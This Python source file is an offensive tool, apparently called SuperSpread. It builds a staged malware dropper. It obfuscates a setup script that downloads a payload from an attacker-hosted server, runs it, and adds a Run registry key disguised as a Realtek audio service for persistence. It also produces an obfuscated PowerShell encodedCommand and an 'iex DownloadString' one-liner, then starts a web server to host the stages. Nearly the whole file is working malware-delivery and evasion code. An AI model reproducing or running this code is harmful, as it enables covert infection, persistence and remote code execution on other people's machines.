import os
import random
from colorama import Fore, Back
import base64

#OBFUSEX#
import zlib
#OBFUSEX#

class obfusex:
    ################
    logo = f"""{Fore.BLUE}       _      __                
      | |    / _|                    
  ___ | |__ | |_ _   _ ___  _____  __
 / _ \| '_ \|  _| | | / __|/ _ \ \/ /
| (_) | |_) | | | |_| \__ \  __/>  < 
 \___/|_.__/|_|  \__,_|___/\___/_/\_\\{Fore.RESET}
    """
    #################

    OFFSET = 30
    VARIABLE_NAME = '_' * 100

    def randomst_ints(count):
        result=""
        ints="0123456789"
        for x in range(count):
            result += ints[random.randint(0, ints.__len__() - 1)]
        return result

    def addbuffer(st, buffer):
        result = ""
        for x in range(st.__len__()):
            if random.randint(1, 100) % 2 == 0:
                pass
            else:
                result += buffer 
            result += st[x]
        return result

    def addbuffer_low(st, buffer):
        result = ""
        for x in range(st.__len__()):
            if random.randint(1, 100) % 8 == 0:
                pass
            else:
                result += buffer
            result += st[x]
        return result

    def obfuscate(content):
        print(f"{Fore.BLUE}[*]{Fore.RESET} Adding buffer")
        print(f"{Fore.BLUE}[*]{Fore.RESET} Encoding payload + buffer")
        b64_content = base64.b64encode(obfusex.addbuffer(obfusex.addbuffer(obfusex.addbuffer(content, "碼"), "國"), "大").encode()).decode()
        index = 0
        print(f"{Fore.BLUE}[*]{Fore.RESET} Generating variables\n")
        code = f'{obfusex.VARIABLE_NAME} = ""; _______________________=b"\\xe7\\xa2\\xbc\\xe5\\x9c\\x8b\\xe5\\xa4\\xa7".decode(); ______________________=1; import base64 as ___________________________________________________________________; __________________________________________________________________ = ___________________________________________________________________.b64decode;'
        print(f"{Fore.YELLOW}[BUFFER_LOW]{Fore.GREEN} ", end='', flush='true')

        for _ in range(int(len(b64_content) / obfusex.OFFSET) + 1):
            _str = ''
            for char in b64_content[index:index + obfusex.OFFSET]:
                byte = str(hex(ord(char)))[2:]
                if len(byte) < 2:
                    byte = '0' + byte
                _str += '\\x' + str(byte)

            _str = base64.b64encode(_str.encode())
            _str = _str.decode()
            _str = obfusex.addbuffer_low(str(_str), "碼")
            print(".", end='', flush='true')
            
            code += f'{obfusex.VARIABLE_NAME} += (__________________________________________________________________("{_str}".replace(_______________________[______________________ - ______________________], "_________".replace("_", "")).encode() )).decode("unicode_escape");'
            index += obfusex.OFFSET
        print(f"{Fore.RESET}\n")
        print(f"{Fore.BLUE}[*]{Fore.RESET} Fusing with main code")
        decoy = obfusex.randomst_ints(4950)

        viriung = f"""____________________________________________________________________=___________________________________________________________________=__________________________________________________________________=_________________________________________________________________=________________________________________________________________=_______________________________________________________________=______________________________________________________________=_____________________________________________________________=____________________________________________________________=___________________________________________________________=__________________________________________________________="??????A///>>>>::APP[+67*(55)]"
if ________________________________________________________________==_______________________________________________________________:
    _______________________________________________________________="{decoy}"
    if ________________________________________________________________ != _______________________________________________________________: pass
    else: ____(___).___"""
        code += f'__________________________={obfusex.VARIABLE_NAME};_________________________=1; ________________________=b"\\xe7\\xa2\\xbc\\xe5\\x9c\\x8b\\xe5\\xa4\\xa7".decode();_____="\\x75\\x74\\x66\\x2d\\x38";__=""*1;______=__import__;_______=exec;________="\\x62\\x61\\x73\\x65\\x36\\x34";_____________=_____; _______(______(________).b64decode(__________________________.encode(_____________)).decode(_____________).replace(________________________[_________________________ - _________________________], __).replace(________________________[_________________________], __).replace(________________________[_________________________ + _________________________], __))'
        
        print(f"{Fore.BLUE}[*]{Fore.RESET} Planting Decoy\n")

        code = "# -*- coding:utf-8 -*-\n" + viriung + "\n" + code
        
        print(f"{Fore.GREEN}[+] Stage 1 done!{Fore.RESET}\n")
        
        return code

    def main(content, slogo=True):
        if slogo:
            print(obfusex.logo)

        try:
            file_content = content

            obfuscated_content = obfusex.obfuscate(file_content)
            compressed = zlib.compress(obfuscated_content.encode())

            print(f"{Fore.BLUE}[*] Compressing Payload{Fore.RESET}")

            compresed_payload = (f"import os as ______________;import sys as _______________; import zlib as _____; __________ = (_____.decompress({compressed}))\nwith open('_______.__', 'wb+') as __:\n __.write(__________);__.close()\n______________.system(_______________.executable + ' _______.__'); ______________.remove('_______.__')")

            print(f"{Fore.GREEN}[+] Obfuscation done!{Fore.RESET}")

            return compresed_payload

        except Exception as ex:
            print(ex)
            exit()

class powfuscate:
    class utils:
        def toHex(st):
            return " ".join("{:02x}".format(ord(c)) for c in st)

        def addbuffer(st, buffer):
            result = ""
            for x in range(st.__len__()):
                if random.randint(1, 100) % 2 == 0:
                    pass
                else:
                    result += buffer
                result += st[x]
            return result

        def powEncode(st):
            return (base64.b64encode(st.encode('UTF-16LE')))

    class program:
        def main(st):
            payload = st

            stage_1 = powfuscate.utils.addbuffer(powfuscate.utils.toHex(payload).replace(" ", "*"), ".!!")
            stage_2 = ("""$_________ = ('"""+stage_1[::-1]+"""'[-1..-("""+str(stage_1.__len__())+""")]-jOIn'').replace(".!!", "").replace("*", " ");$__________ = $_________ -sPlIt ' ' |fOreAcH-obJEcT {[cHAr][bYtE]"0x$_"};$___________ = $__________ -jOIn '';$___________ | &("{2}{0}{1}"-f$sHElliD[10*0+10-7+14],'x',$env:?????m????[4])""")

            stage_3_half = powfuscate.utils.addbuffer(powfuscate.utils.addbuffer(stage_2, "┬®"), "┬Â")
            stage_3 = """iex @"
"""+stage_3_half.replace("$", "`$")+"""
"@.replace("┬Â", "").replace("┬®", "") | &("{2}{0}{1}"-f$sHElliD[10*0+10-7+14],'x',$env:?????m????[4])"""

            result = f"powershell -encodedCommand {(powfuscate.utils.powEncode(stage_3).decode())}"
            return result

    def obfuscate(st):
        return powfuscate.program.main(st)


class payloads:
    def get_setup(url):
        normal = """import codecs as ______________________________________________________________________________________________________________________________________
from sys import executable as ___________________________________________________
from urllib import request as _____________________________________________________
from os import getenv, system, name, listdir
from os.path import isfile as ______________________________________________________
import winreg as ___________________________________________________________________
from random import choice as _______________________________________________________
if 1==1:
    pass
_________________________________ = ______________________________________________________________________________________________________________________________________
__________________________________ = ((3**2)*(2+2+2+2+2)) + (1*2)
if 1==1:
    pass
__ = name
def ______():
    for x in range(10):
        if 99 > x and 1!=10:
            exit()
        else:
            ______()
___ = str(str('n'*2)[0:1]) + str('t'*1)
if __ != ___:
    ______()
____________________________________________________________________ = '""" + url + """'
def _________________():
    _____ = _______________________________________________________([getenv(______________________________________________________________________________________________________________________________________.encode("NCCQNGN", 'rot13')), getenv(______________________________________________________________________________________________________________________________________.encode("YBPNYNCCQNGN", 'rot13'))])
    ____ = listdir(_____)
    for _ in range(10):
        ________ = _______________________________________________________(____)
        _________ = _____ + "\\\\" + ________
        if not ______________________________________________________(_________) and " "*1 not in ________:
            return _________
    return getenv(_________________________________.encode('GRZC', 'rot13'))

def ________________():
    __ = ''.join(_______________________________________________________('bcdefghijklmnopqrstuvwxyz') for _ in range(8))
    ___ = ['.dll', '.png', '.jpg', '.ink', '.url', '.jar', '.tmp', '.db', '.cfg']
    return __ + _______________________________________________________(___)
def _______________(_):
    global ____________________________________________________________________
    with open(_, mode='w', encoding='utf-8') as ____:
        ____.write(_____________________________________________________.urlopen(____________________________________________________________________).read().decode("utf8"))
def ______________(_):
    system(f"start {___________________________________________________} {_}")
def _____________(_):
    ___ = (_________________________________.encode('.lnegflFugynrUlgvehprF', 'rot13')[::-1])+"exe"[::-1]
    ______ = f"{___________________________________________________} {_}"
    ____________ = ___________________________________________________________________.HKEY_CURRENT_USER
    _____________ = 'nuR\\\\noisreVtnerruC\\\\swodniW\\\\tfosorciM\\\\ERAWTFOS'[::-1]
    ______________ = ___________________________________________________________________.CreateKeyEx(____________, _____________, 0, ___________________________________________________________________.KEY_WRITE)
    ___________________________________________________________________.SetValueEx(______________, 'ecivreS lasrevinU oiduA DH ketlaeR'[::-1], 0, ___________________________________________________________________.REG_SZ, f"{___} & {______}")
_________ = str(chr(__________________________________))
____________ = _________________() + _________ + ________________()
_______________(____________)
______________(____________)
try:
    _____________(____________)
except:
    pass
"""

        print(f"{Fore.GREEN}-------- obfuscating setup-script using obfusex --------{Fore.RESET}\n")
        obfuscated = obfusex.main(normal, False)
        print(f"\n{Fore.GREEN}--------  obfuscation (setup-script) finished   --------{Fore.RESET}\n")

        return obfuscated

    def get_holder(url):
        rand = program.randomString(16)
        ex = program.randomExtension()
        normal = f"""import os
os.system("curl {url} -o {rand}{ex} && pythonw {rand}{ex}")
"""
        print(f"{Fore.GREEN}-------- obfuscating holder using obfusex --------{Fore.RESET}\n")
        obfuscated = obfusex.main(normal, False)
        print(f"\n{Fore.GREEN}--------  obfuscation (holder) finished   --------{Fore.RESET}\n")

        return obfuscated

    def get_exploit(path):
        contents = ""
        with open(path) as f:
            contents = f.read()
            f.close()
        
        return contents

    def get_obf_pws(url):
        file = program.randomString(16) + ".pyw"
        normal = f"curl {url} -o {file}; pythonw {file}"
        obf = powfuscate.obfuscate(normal)
        
        return obf

class utils:
    def write_to_file(file, value):
        f = open(file, "w")
 
        f.write(value)
        f.close()

class program:
    def ascii_art():
        return f"""{Fore.BLUE} _____                       _____                          _ 
/  ___|                     /  ___|        {Fore.YELLOW}v1.0.0.0{Fore.BLUE}        | |
\ `--. _   _ _ __   ___ _ __\ `--. _ __  _ __ ___  __ _  __| |
 `--. \ | | | '_ \ / _ \ '__|`--. \ '_ \| '__/ _ \/ _` |/ _` |
/\__/ / |_| | |_) |  __/ |  /\__/ / |_) | | |  __/ (_| | (_| |
\____/ \__,_| .__/ \___|_|  \____/| .__/|_|  \___|\__,_|\__,_|
            | |                   | |                         
            |_|                   |_|                         {Fore.RESET}
"""
    
    def randomString(l):
        result = ""
        letters = "abcdefghijklmnopqrstuvwxyz"
        
        for x in range(l):
            result += letters[random.randint(0, len(letters) - 1)]
    
        return result
    
    def randomExtension():
        extensions = [".png", ".dll", ".lnk", ".ink", ".jpg"]
        
        return random.choice(extensions)

    def main(args):
        print(program.ascii_art())

        print(f"{Fore.RED}[-] Removing old folders{Fore.RESET}\n")

        os.system("rm -rf ./spread_*")

        exploit_path = "exploit_.py"
        public_addr  = ""
        private_addr = ""

        if len(args) > 1:
            try:
                epath = args[1].split("@")[1] ######
                pp = args[1].split("@")[0]
                public = pp.split('/')[1] #####
                private_end = pp.split('/')[0]
                private = "192.168." + private_end ####

                exploit_path = epath
                public_addr = public
                private_addr = private
            except:
                print(f"{Fore.RED}[-]{Fore.RESET} Args are not in a valid format!")
                exit()
        else:
            print(f"{Fore.RED}[-]{Fore.RESET} No args received!")
            exit()

        # superspread 178.175/93.15.119.51@exploit_.py
        

        current_folder = os.getcwd()

        print(f"{Fore.BLUE}[*]{Fore.RESET} Generating payloads")

        temporary_folder = "spread_" + program.randomString(16)
        exploit_name = program.randomString(16) + program.randomExtension()
        setup_name = program.randomString(16) + program.randomExtension()
        holder_name = program.randomString(16) + program.randomExtension()
        pws_name = program.randomString(16) + ".ps1"

        full_temporary_folder = os.path.join(current_folder, temporary_folder)
        full_exploit_name = os.path.join(os.path.join(current_folder, temporary_folder), exploit_name)
        full_setup_name   = os.path.join(os.path.join(current_folder, temporary_folder), setup_name)
        full_holder_name  = os.path.join(os.path.join(current_folder, temporary_folder), holder_name)
        full_pws_name  = os.path.join(os.path.join(current_folder, temporary_folder), pws_name)


        hosting_payload = f"sudo php -sS {private_addr}:80 -t {full_temporary_folder}"

        pws_long = payloads.get_obf_pws(f"http://{public_addr}/{holder_name}")
        
        print(f"{Fore.BLUE}[*]{Fore.RESET} Making Directory ({Fore.BLUE}{temporary_folder}/{Fore.RESET})")
        os.mkdir(full_temporary_folder)
        
        print()

        utils.write_to_file(full_exploit_name, payloads.get_exploit(exploit_path))
        utils.write_to_file(full_setup_name, payloads.get_setup(f"http://{public_addr}/{exploit_name}"))
        utils.write_to_file(full_holder_name, payloads.get_holder(f"http://{public_addr}/{setup_name}"))        
        utils.write_to_file(full_pws_name, pws_long)        

        pws_short = f"iex ((New-Object System.Net.WebClient).DownloadString('http://{public_addr}/{pws_name}'))"

        print(f"{Fore.GREEN}[+]{Fore.RESET} Powershell-Payload: {Fore.BLUE}{pws_short}{Fore.RESET}")

        print()

        print(f"{Fore.BLUE}[*]{Fore.RESET} Starting WEB-Server\n")
        os.system(hosting_payload)


import sys
if __name__ == "__main__":
    try:
        program.main(sys.argv)
    except KeyboardInterrupt:
        pass